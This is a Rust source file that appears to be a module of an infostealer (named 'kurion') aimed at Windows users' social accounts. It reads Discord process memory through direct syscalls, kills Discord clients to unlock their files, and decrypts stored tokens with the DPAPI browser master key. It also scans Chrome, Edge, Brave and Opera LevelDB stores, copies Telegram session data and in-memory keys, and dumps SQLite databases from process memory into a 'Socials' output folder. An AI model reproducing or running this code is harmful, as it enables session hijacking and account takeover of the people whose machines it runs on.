use std::path::{Path, PathBuf};
use std::fs;
use regex_lite::Regex;

use crate::f_by_name;
#[cfg(target_os = "windows")]
use crate::fnv1a;

#[cfg(target_os = "windows")]
use windows::Win32::System::Diagnostics::ToolHelp::*;
#[cfg(target_os = "windows")]
use windows::Win32::Foundation::{HANDLE, CloseHandle};
#[cfg(target_os = "windows")]
use windows::Win32::System::Threading::{OpenProcess, TerminateProcess, PROCESS_TERMINATE};
#[cfg(target_os = "windows")]
use kurion_sys::internal_api::{
    n_open_process_syscall, n_read_virtual_memory_syscall, n_query_virtual_memory_syscall, n_close_syscall,
    CLIENT_ID, OBJECT_ATTRIBUTES
};
#[cfg(target_os = "windows")]
use std::ptr;
#[cfg(target_os = "windows")]
use std::ffi::c_void;
#[cfg(target_os = "windows")]
use windows::Win32::System::Memory::MEMORY_BASIC_INFORMATION as WinMBI;

const DISCORD_PROCESS_NAMES: [&str; 5] = [
    "discord.exe",
    "discordcanary.exe",
    "discordptb.exe",
    "discorddevelopment.exe",
    "lightcord.exe",
];

const DISCORD_FOLDER_NAMES: [&str; 7] = [
    "discord",
    "discordcanary",
    "discordptb",
    "Lightcord",
    "vesktop",
    "webcord",
    "discorddevelopment",
];

#[cfg(windows)]
fn _terminate_process(_process_name: &str) {
}

#[cfg(not(windows))]
fn _terminate_process(_process_name: &str) {
}

#[cfg(target_os = "windows")]
fn t_processes_by_names(names: &[&str]) {
    unsafe {
        if let Ok(snapshot) = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) {
            let mut entry = PROCESSENTRY32 {
                dwSize: std::mem::size_of::<PROCESSENTRY32>() as u32,
                ..Default::default()
            };

            if Process32First(snapshot, &mut entry).is_ok() {
                loop {
                    let name = std::ffi::CStr::from_ptr(entry.szExeFile.as_ptr() as *const i8).to_string_lossy();
                    let name_lower = name.to_ascii_lowercase();

                    if names.contains(&name_lower.as_str()) {
                         if let Ok(handle) = OpenProcess(PROCESS_TERMINATE, false, entry.th32ProcessID) {
                              let _ = TerminateProcess(handle, 0);
                              let _ = CloseHandle(handle);
                         }
                    }

                    if Process32Next(snapshot, &mut entry).is_err() {
                        break;
                    }
                }
            }
            let _ = CloseHandle(snapshot);
        }
    }
}

#[cfg(not(target_os = "windows"))]
fn t_processes_by_names(_names: &[&str]) {}

pub fn e_discord(output_base: &Path) -> usize {
    let mut memory_tokens: Vec<String> = Vec::new();
    let mut browser_tokens: Vec<String> = Vec::new();

    #[cfg(target_os = "windows")]
    {
        let token_regex = Regex::new(r"([\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110})").unwrap();

        for &name in &DISCORD_PROCESS_NAMES {
            if let Some(tokens) = d_process_memory_by_name(name, &token_regex) {
                for token in tokens {
                    if !memory_tokens.contains(&token) {
                        memory_tokens.push(token);
                    }
                }
            }
        }

        if memory_tokens.is_empty() {
            let discord_paths = f_discord_paths();

            if !discord_paths.is_empty() {
                t_processes_by_names(&DISCORD_PROCESS_NAMES);
                std::thread::sleep(std::time::Duration::from_millis(500));

                e_discord_file_direct(&discord_paths, &mut memory_tokens);

                if memory_tokens.is_empty() {
                    e_discord_file_robust(&discord_paths, &mut memory_tokens);
                }
            }
        }

        e_discord_from_browsers(&mut browser_tokens);

        for token in &memory_tokens {
            browser_tokens.retain(|t| t != token);
        }
    }

    memory_tokens.sort();
    memory_tokens.dedup();
    browser_tokens.sort();
    browser_tokens.dedup();

    let total = memory_tokens.len() + browser_tokens.len();

    if total > 0 {
        let output_dir = output_base.join("Socials").join("Discord");
        let _ = fs::create_dir_all(&output_dir);
        let tokens_file = output_dir.join("tokens.txt");
        let separator = "------------------------------";

        let mut content = String::new();

        if !memory_tokens.is_empty() {
            content.push_str("Memory scan part\n");
            content.push_str(separator);
            content.push('\n');
            for token in &memory_tokens {
                if token.len() > 50 {
                    content.push_str(&format!("Token: {}\n", token));
                    content.push_str(separator);
                    content.push('\n');
                }
            }
        }

        if !browser_tokens.is_empty() {
            if !content.is_empty() {
                content.push('\n');
            }
            content.push_str("LevelDB Tokens part\n");
            content.push_str(separator);
            content.push('\n');
            for token in &browser_tokens {
                if token.len() > 50 {
                    content.push_str(&format!("Token: {}\n", token));
                    content.push_str(separator);
                    content.push('\n');
                }
            }
        }

        if !content.is_empty() {
            let _ = fs::write(&tokens_file, &content);
        }
    }

    total
}

fn f_discord_paths() -> Vec<PathBuf> {
    let mut paths = Vec::new();
    if let Ok(appdata_val) = std::env::var("APPDATA") {
         let appdata = PathBuf::from(appdata_val);
         if let Ok(entries) = fs::read_dir(&appdata) {
             for entry in entries.flatten() {
                 if !entry.path().is_dir() { continue; }
                 let name = entry.file_name();
                 let name_lower = name.to_string_lossy().to_ascii_lowercase();
                 if DISCORD_FOLDER_NAMES.contains(&name_lower.as_str()) {
                     paths.push(entry.path());
                 }
             }
         }
    }
    paths
}

#[cfg(target_os = "windows")]
fn e_discord_from_browsers(tokens: &mut Vec<String>) {
    let localappdata = match std::env::var("LOCALAPPDATA") {
        Ok(v) => PathBuf::from(v),
        Err(_) => return,
    };

    let mut user_data_dirs: Vec<PathBuf> = Vec::new();

    if let Ok(entries) = fs::read_dir(&localappdata) {
        for entry in entries.flatten() {
            if !entry.path().is_dir() { continue; }
            let entry_name = entry.file_name().to_string_lossy().to_string();
            if entry_name == "Google" || entry_name == "Microsoft" || entry_name == "BraveSoftware" || entry_name == "Vivaldi" {
                let sub_dirs: &[&str] = match entry_name.as_str() {
                    "Google" => &["Chrome"],
                    "Microsoft" => &["Edge"],
                    "BraveSoftware" => &["Brave-Browser"],
                    _ => &[],
                };

                if sub_dirs.is_empty() {
                    if let Some(ud) = f_by_name(&entry.path(), "User Data") {
                        user_data_dirs.push(ud);
                    }
                } else {
                    for &sub_name in sub_dirs {
                        if let Some(sub_dir) = f_by_name(&entry.path(), sub_name) {
                            if let Some(ud) = f_by_name(&sub_dir, "User Data") {
                                user_data_dirs.push(ud);
                            }
                        }
                    }
                }
            }
        }
    }

    if let Ok(appdata) = std::env::var("APPDATA") {
        let appdata_path = PathBuf::from(appdata);
        if let Some(opera_sw) = f_by_name(&appdata_path, "Opera Software") {
            if let Some(opera_stable) = f_by_name(&opera_sw, "Opera Stable") {
                user_data_dirs.push(opera_stable);
            }
            if let Some(opera_gx) = f_by_name(&opera_sw, "Opera GX Stable") {
                user_data_dirs.push(opera_gx);
            }
        }
    }

    for ud_dir in &user_data_dirs {
        let local_state = match f_by_name(ud_dir, "Local State") {
            Some(p) => p,
            None => continue,
        };
        let master_key = match e_master_key(&local_state) {
            Ok(key) => key,
            Err(_) => continue,
        };

        if let Ok(entries) = fs::read_dir(ud_dir) {
            for entry in entries.flatten() {
                if !entry.path().is_dir() { continue; }
                let name = entry.file_name().to_string_lossy().to_string();
                if name == "Default" || name.starts_with("Profile ") {
                    s_profile_leveldb_for_discord(&entry.path(), &master_key, tokens);
                }
            }
        }

        s_profile_leveldb_for_discord(ud_dir, &master_key, tokens);
    }
}

#[cfg(target_os = "windows")]
fn s_profile_leveldb_for_discord(profile_dir: &Path, master_key: &[u8], tokens: &mut Vec<String>) {
    if let Some(ls_dir) = f_by_name(profile_dir, "Local Storage") {
        if let Some(leveldb_path) = f_by_name(&ls_dir, "leveldb") {
            if let Ok(entries) = fs::read_dir(&leveldb_path) {
                for entry in entries.flatten() {
                    let path = entry.path();
                    let ext = path.extension().and_then(|e| e.to_str()).unwrap_or("");
                    if ext == "ldb" || ext == "log" {
                        if let Ok(bytes) = fs::read(&path) {
                            e_tokens_from_bytes(&bytes, master_key, tokens);
                        }
                    }
                }
            }
        }
    }
}

fn e_discord_file_direct(discord_paths: &[PathBuf], tokens: &mut Vec<String>) {
    for discord_path in discord_paths {
        let local_state = match f_by_name(discord_path, "Local State") {
            Some(p) => p,
            None => continue,
        };
        let master_key = match e_master_key(&local_state) {
            Ok(key) => key,
            Err(_) => continue,
        };

        if let Some(ls_dir) = f_by_name(discord_path, "Local Storage") {
            if let Some(leveldb_path) = f_by_name(&ls_dir, "leveldb") {
                if let Ok(entries) = fs::read_dir(&leveldb_path) {
                    for entry in entries.flatten() {
                        let path = entry.path();
                        let ext = path.extension().and_then(|e| e.to_str()).unwrap_or("");
                        if ext == "ldb" || ext == "log" {
                            if let Ok(content) = fs::read_to_string(&path) {
                                e_tokens_from_content(&content, &master_key, tokens);
                            } else if let Ok(bytes) = fs::read(&path) {
                                let content = String::from_utf8_lossy(&bytes);
                                e_tokens_from_content(&content, &master_key, tokens);
                            }
                        }
                    }
                }
            }
        }
    }
}

fn e_discord_file_robust(discord_paths: &[PathBuf], tokens: &mut Vec<String>) {
    let temp_dir = std::env::temp_dir();

    for (i, discord_path) in discord_paths.iter().enumerate() {
        let local_state = match f_by_name(discord_path, "Local State") {
            Some(p) => p,
            None => continue,
        };
        let master_key = match e_master_key(&local_state) {
            Ok(key) => key,
            Err(_) => continue,
        };

        if let Some(ls_dir) = f_by_name(discord_path, "Local Storage") {
            if let Some(leveldb_path) = f_by_name(&ls_dir, "leveldb") {
                let temp_dest = temp_dir.join(format!("kurion_ldb_{}", i));
                let _ = fs::create_dir_all(&temp_dest);

                if let Ok(entries) = fs::read_dir(&leveldb_path) {
                    for entry in entries.flatten() {
                        let path = entry.path();
                        let ext = path.extension().and_then(|e| e.to_str()).unwrap_or("");
                        
                        if ext == "ldb" || ext == "log" {
                            let dest_file = temp_dest.join(path.file_name().unwrap());
                            if fs::copy(&path, &dest_file).is_ok() {
                                if let Ok(bytes) = fs::read(&dest_file) {
                                    e_tokens_from_bytes(&bytes, &master_key, tokens);
                                }
                            }
                        }
                    }
                }
                let _ = fs::remove_dir_all(&temp_dest);
            }
        }
    }
}

fn i_token_char(b: u8) -> bool {
    (b >= b'A' && b <= b'Z') || (b >= b'a' && b <= b'z') || (b >= b'0' && b <= b'9') || b == b'-' || b == b'_'
}

fn e_tokens_from_bytes(data: &[u8], master_key: &[u8], tokens: &mut Vec<String>) {
    let prefix = b"dQw4w9WgXcQ:";
    for i in 0..data.len().saturating_sub(prefix.len()) {
        if &data[i..i+prefix.len()] == prefix {
            let start = i + prefix.len();
            let mut end = start;
            while end < data.len() {
                let b = data[end];
                if (b >= b'A' && b <= b'Z') || (b >= b'a' && b <= b'z') || (b >= b'0' && b <= b'9') || b == b'+' || b == b'/' || b == b'=' || b == b'_' || b == b'-' {
                    end += 1;
                } else {
                    break;
                }
            }
            if end > start {
                 if let Ok(token_str) = String::from_utf8(data[i..end].to_vec()) {
                     if let Some(decrypted) = d_discord_token(&token_str, master_key) {
                         tokens.push(decrypted);
                     }
                 }
            }
        }
    }

    for i in 24..data.len().saturating_sub(32) {
        if data[i] == b'.' {
             let mut p1_len = 0;
             for j in (0..i).rev() {
                 if i_token_char(data[j]) { p1_len += 1; } else { break; }
                 if p1_len > 26 { break; }
             }
             if p1_len < 24 || p1_len > 26 { continue; }
             let p1_start = i - p1_len;

             if i + 7 >= data.len() { continue; }
             let mut p2_len = 0;
             for k in 1..=6 {
                 if i_token_char(data[i+k]) { p2_len += 1; }
             }
             if p2_len != 6 || data[i+7] != b'.' { continue; }

             let p3_start = i + 8;
             let mut p3_len = 0;
             for k in p3_start..data.len() {
                 if i_token_char(data[k]) { 
                     p3_len += 1; 
                     if p3_len > 110 { break; }
                 } else { break; }
             }
             if p3_len < 25 || p3_len > 110 { continue; }

             let full_token_bytes = &data[p1_start..p3_start+p3_len];
             if let Ok(s) = String::from_utf8(full_token_bytes.to_vec()) {
                 tokens.push(s);
             }
        }
    }
}

#[cfg(target_os = "windows")]
fn d_process_memory_by_name(target_name: &str, _regex: &Regex) -> Option<Vec<String>> {
    unsafe {
        let mut process_id = 0;
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0).ok()?;

        let mut entry = PROCESSENTRY32 {
            dwSize: std::mem::size_of::<PROCESSENTRY32>() as u32,
            ..Default::default()
        };

        if Process32First(snapshot, &mut entry).is_ok() {
            loop {
                let name = std::ffi::CStr::from_ptr(entry.szExeFile.as_ptr() as *const i8).to_string_lossy();
                let name_lower = name.to_ascii_lowercase();
                if name_lower == target_name {
                    process_id = entry.th32ProcessID;
                    break;
                }
                if Process32Next(snapshot, &mut entry).is_err() {
                    break;
                }
            }
        }
        let _ = CloseHandle(snapshot);

        if process_id == 0 {
            return None;
        }

        let mut h_process = HANDLE(0 as *mut _);
        let mut client_id = CLIENT_ID {
            unique_process: HANDLE(process_id as *mut _),
            unique_thread: HANDLE(0 as *mut _),
        };
        let mut oa = OBJECT_ATTRIBUTES {
            length: std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
            root_directory: HANDLE(0 as *mut _),
            object_name: ptr::null_mut(),
            attributes: 0,
            security_descriptor: ptr::null_mut(),
            security_quality_of_service: ptr::null_mut(),
        };

        let desired_access = 0x0410;

        let status = n_open_process_syscall(
            &mut h_process,
            desired_access,
            &mut oa,
            &mut client_id as *mut _ as *mut c_void
        );

        if status.0 != 0 || h_process.is_invalid() {
            return None;
        }

        let mut found_items = Vec::new();
        let mut address: usize = 0;
        let mut mbi = WinMBI::default();

        const MEM_COMMIT: u32 = 0x1000;
        const MEM_PRIVATE: u32 = 0x20000;
        const PAGE_READWRITE: u32 = 0x04;
        const PAGE_WRITECOPY: u32 = 0x08;
        const MIN_REGION: usize = 4096;
        const MAX_REGION: usize = 64 * 1024 * 1024;

        loop {
            let mut return_len = 0;
            let status = n_query_virtual_memory_syscall(
                h_process,
                address as *mut c_void,
                0,
                &mut mbi as *mut _ as *mut c_void,
                std::mem::size_of::<WinMBI>(),
                &mut return_len
            );

            if status.0 != 0 {
                break;
            }

            let protect = mbi.Protect.0;
            let is_committed = mbi.State.0 == MEM_COMMIT;
            let is_private = mbi.Type.0 == MEM_PRIVATE;
            let is_rw = protect == PAGE_READWRITE || protect == PAGE_WRITECOPY;
            let size_ok = mbi.RegionSize >= MIN_REGION && mbi.RegionSize <= MAX_REGION;

            if is_committed && is_private && is_rw && size_ok {
                 let mut buffer = vec![0u8; mbi.RegionSize];
                 let mut bytes_read = 0;

                 let read_status = n_read_virtual_memory_syscall(
                     h_process,
                     mbi.BaseAddress,
                     buffer.as_mut_ptr() as *mut c_void,
                     mbi.RegionSize,
                     &mut bytes_read
                 );

                 if read_status.0 == 0 && bytes_read > 0 {
                      let scan_len = bytes_read.min(buffer.len());
                      s_buffer_for_tokens(&buffer[..scan_len], &mut found_items);
                      if !found_items.is_empty() {
                          break;
                      }
                 }
            }

            let next_addr = (mbi.BaseAddress as usize) + mbi.RegionSize;
            if next_addr <= address { break; }
            address = next_addr;
        }

        let _ = n_close_syscall(h_process.0);
        if found_items.is_empty() { None } else { Some(found_items) }
    }
}

#[cfg(target_os = "windows")]
fn s_buffer_for_tokens(buf: &[u8], tokens: &mut Vec<String>) {
    let len = buf.len();
    if len < 50 { return; }

    let mut i = 24;
    while i < len.saturating_sub(40) {
        if buf[i] != b'.' { i += 1; continue; }

        let mut p1_len = 0usize;
        let mut j = i;
        while j > 0 {
            j -= 1;
            if i_token_char(buf[j]) { p1_len += 1; } else { break; }
            if p1_len > 26 { break; }
        }
        if p1_len < 24 || p1_len > 26 { i += 1; continue; }

        let dot2 = i + 7;
        if dot2 >= len || buf[dot2] != b'.' { i += 1; continue; }
        let mut p2_ok = true;
        for k in (i+1)..dot2 {
            if !i_token_char(buf[k]) { p2_ok = false; break; }
        }
        if !p2_ok { i += 1; continue; }

        let p3_start = dot2 + 1;
        let mut p3_len = 0usize;
        let mut k = p3_start;
        while k < len && i_token_char(buf[k]) {
            p3_len += 1;
            if p3_len > 110 { break; }
            k += 1;
        }
        if p3_len < 25 || p3_len > 110 { i += 1; continue; }

        let token_start = i - p1_len;
        let token_end = p3_start + p3_len;
        if let Ok(s) = std::str::from_utf8(&buf[token_start..token_end]) {
            let owned = s.to_string();
            if !tokens.contains(&owned) {
                tokens.push(owned);
            }
        }
        i = token_end;
    }
}

#[cfg(not(target_os = "windows"))]
fn d_process_memory_by_name(_target_name: &str, _regex: &Regex) -> Option<Vec<String>> {
    None
}

fn e_master_key(local_state_path: &Path) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let content = fs::read_to_string(local_state_path)?;
    let json: serde_json::Value = serde_json::from_str(&content)?;

    let encrypted_key_b64 = json
        .get("os_crypt")
        .and_then(|o| o.get("encrypted_key"))
        .and_then(|k| k.as_str())
        .ok_or("No encrypted_key in Local State")?;

    use base64::Engine;
    let encrypted_key = base64::engine::general_purpose::STANDARD.decode(encrypted_key_b64)?;

    if encrypted_key.len() < 5 || &encrypted_key[..5] != b"DPAPI" {
        return Err("Invalid DPAPI prefix".into());
    }

    kurion_crypto::dpapi::u_data(&encrypted_key[5..])
        .map_err(|e| format!("DPAPI decryption failed: {}", e).into())
}

fn e_tokens_from_content(content: &str, master_key: &[u8], tokens: &mut Vec<String>) {
    let encrypted_regex = Regex::new(r#"dQw4w9WgXcQ:[^"]*"#).unwrap();

    let normal_regex = Regex::new(r"([\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110})").unwrap();

    for cap in encrypted_regex.captures_iter(content) {
        if let Some(match_str) = cap.get(0) {
            let token_str = match_str.as_str();
            if let Some(decrypted) = d_discord_token(token_str, master_key) {
                tokens.push(decrypted);
            }
        }
    }

    for cap in normal_regex.captures_iter(content) {
        if let Some(token) = cap.get(1) {
            tokens.push(token.as_str().to_string());
        }
    }
}

fn d_discord_token(token: &str, master_key: &[u8]) -> Option<String> {
    if token.starts_with("dQw4w9WgXcQ:") {
        use base64::Engine;
        let encrypted_part = &token[12..];
        if let Ok(encrypted_bytes) = base64::engine::general_purpose::STANDARD.decode(encrypted_part) {
            kurion_crypto::aes_gcm::AesGcm::decrypt(master_key, &encrypted_bytes)
                .and_then(|decrypted| String::from_utf8(decrypted).ok())
        } else {
            None
        }
    } else {
        Some(token.to_string())
    }
}

pub fn e_telegram(output_base: &Path) -> bool {
    let userprofile = match std::env::var("USERPROFILE") {
        Ok(path) => PathBuf::from(path),
        Err(_) => return false,
    };

    let roaming = userprofile.join("AppData").join("Roaming");

    let tg_dir = match f_by_name(&roaming, "Telegram Desktop") {
        Some(p) => p,
        None => return false,
    };

    let tdata_path = match f_by_name(&tg_dir, "tdata") {
        Some(p) => p,
        None => return false,
    };

    let output_dir = output_base.join("Socials").join("Telegram").join("tdata");
    if let Err(_) = fs::create_dir_all(&output_dir) {
        return false;
    }

    let mut copied_files = 0;

    #[cfg(target_os = "windows")]
    {
        let hex_key_regex = Regex::new(r"[0-9a-fA-F]{64}").unwrap();
        let auth_regex = Regex::new(r"[A-Za-z0-9+/]{100,}={0,2}").unwrap();

        if let Some(hex_keys) = d_process_memory_by_name("telegram.exe", &hex_key_regex) {
            if !hex_keys.is_empty() {
                let hex_file = output_dir.join("session_keys_memory.txt");
                let _ = fs::write(&hex_file, hex_keys.join("\n"));
                copied_files += 1;
            }
        }

        if let Some(auth_data) = d_process_memory_by_name("telegram.exe", &auth_regex) {
            if !auth_data.is_empty() {
                let auth_file = output_dir.join("auth_data_memory.txt");
                let _ = fs::write(&auth_file, auth_data.join("\n"));
                copied_files += 1;
            }
        }
    }

    if let Ok(entries) = fs::read_dir(&tdata_path) {
        for entry in entries.flatten() {
            let filename = entry.file_name();
            let filename_str = filename.to_string_lossy();
            let src_path = entry.path();
            let dest_path = output_dir.join(&filename);

            if filename_str == "key_datas" {
                if fs::copy(&src_path, &dest_path).is_ok() {
                    copied_files += 1;
                }
            }
            else if filename_str.len() == 16 {
                if src_path.is_dir() {
                    if c_dir_recursive(&src_path, &dest_path).is_ok() {
                        copied_files += 1;
                    }
                } else {
                    if fs::copy(&src_path, &dest_path).is_ok() {
                        copied_files += 1;
                    }
                }
            }
        }
    }

    copied_files > 0
}

fn c_dir_recursive(src: &Path, dst: &Path) -> std::io::Result<()> {
    fs::create_dir_all(dst)?;

    for entry in fs::read_dir(src)? {
        let entry = entry?;
        let src_path = entry.path();
        let dest_path = dst.join(entry.file_name());

        if src_path.is_dir() {
            c_dir_recursive(&src_path, &dest_path)?;
        } else {
            let _ = fs::copy(&src_path, &dest_path);
        }
    }

    Ok(())
}

pub fn e_signal(output_base: &Path) -> bool {
    // Signal disabled — skipped
    let _ = output_base;
    return false;
}

#[cfg(target_os = "windows")]
pub fn d_database_from_memory(target_hash: u64) -> Option<Vec<u8>> {
    unsafe {
        let mut process_id = 0;
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0).ok()?;

        let mut entry = PROCESSENTRY32 {
            dwSize: std::mem::size_of::<PROCESSENTRY32>() as u32,
            ..Default::default()
        };

        if Process32First(snapshot, &mut entry).is_ok() {
            loop {
                let name = std::ffi::CStr::from_ptr(entry.szExeFile.as_ptr() as *const i8).to_string_lossy();
                let name_lower = name.to_ascii_lowercase();
                if fnv1a(name_lower.as_bytes()) == target_hash {
                    process_id = entry.th32ProcessID;
                    break;
                }
                if Process32Next(snapshot, &mut entry).is_err() {
                    break;
                }
            }
        }
        let _ = CloseHandle(snapshot);

        if process_id == 0 {
            return None;
        }

        let mut h_process = HANDLE(0 as *mut _);
        let mut client_id = CLIENT_ID {
            unique_process: HANDLE(process_id as *mut _),
            unique_thread: HANDLE(0 as *mut _),
        };
        let mut oa = OBJECT_ATTRIBUTES {
            length: std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
            root_directory: HANDLE(0 as *mut _),
            object_name: ptr::null_mut(),
            attributes: 0,
            security_descriptor: ptr::null_mut(),
            security_quality_of_service: ptr::null_mut(),
        };

        let desired_access = 0x0410;

        let status = n_open_process_syscall(
            &mut h_process,
            desired_access,
            &mut oa,
            &mut client_id as *mut _ as *mut c_void
        );

        if status.0 != 0 || h_process.is_invalid() {
            return None;
        }

        let sqlite_header = b"SQLite format 3\0";
        let mut database_content: Option<Vec<u8>> = None;
        let mut address: usize = 0;
        let mut mbi = WinMBI::default();

        loop {
            let mut return_len = 0;
            let status = n_query_virtual_memory_syscall(
                h_process,
                address as *mut c_void,
                0,
                &mut mbi as *mut _ as *mut c_void,
                std::mem::size_of::<WinMBI>(),
                &mut return_len
            );

            if status.0 != 0 {
                break;
            }

            const MAX_REGION_SIZE: usize = 100 * 1024 * 1024;
            let protect = mbi.Protect.0;

            if mbi.State.0 == 0x1000 && (protect & 0x01 == 0) && mbi.RegionSize < MAX_REGION_SIZE {
                let mut buffer = vec![0u8; mbi.RegionSize];
                let mut bytes_read = 0;

                let read_status = n_read_virtual_memory_syscall(
                    h_process,
                    mbi.BaseAddress,
                    buffer.as_mut_ptr() as *mut c_void,
                    mbi.RegionSize,
                    &mut bytes_read
                );

                if read_status.0 == 0 && bytes_read >= sqlite_header.len() {
                    if let Some(pos) = buffer.windows(sqlite_header.len())
                        .position(|window| window == sqlite_header) {
                        if pos + 18 < buffer.len() {
                            let page_size = u16::from_be_bytes([buffer[pos + 16], buffer[pos + 17]]) as usize;
                            if page_size > 0 && page_size <= 65536 {
                                database_content = Some(buffer[pos..].to_vec());
                                break;
                            }
                        }
                    }
                }
            }

            let next_addr = (mbi.BaseAddress as usize) + mbi.RegionSize;
            if next_addr <= address { break; }
            address = next_addr;
        }

        let _ = n_close_syscall(h_process.0);
        database_content
    }
}

#[cfg(not(target_os = "windows"))]
pub fn d_database_from_memory(_target_hash: u64) -> Option<Vec<u8>> {
    None
}

pub fn e_all_socials(output_base: &Path) -> SocialsStats {
    let mut stats = SocialsStats::default();

    stats.discord_tokens = e_discord(output_base);
    stats.telegram_extracted = e_telegram(output_base);
    stats.signal_extracted = e_signal(output_base);

    stats
}

#[derive(Debug, Default)]
pub struct SocialsStats {
    pub discord_tokens: usize,
    pub telegram_extracted: bool,
    pub signal_extracted: bool,
}
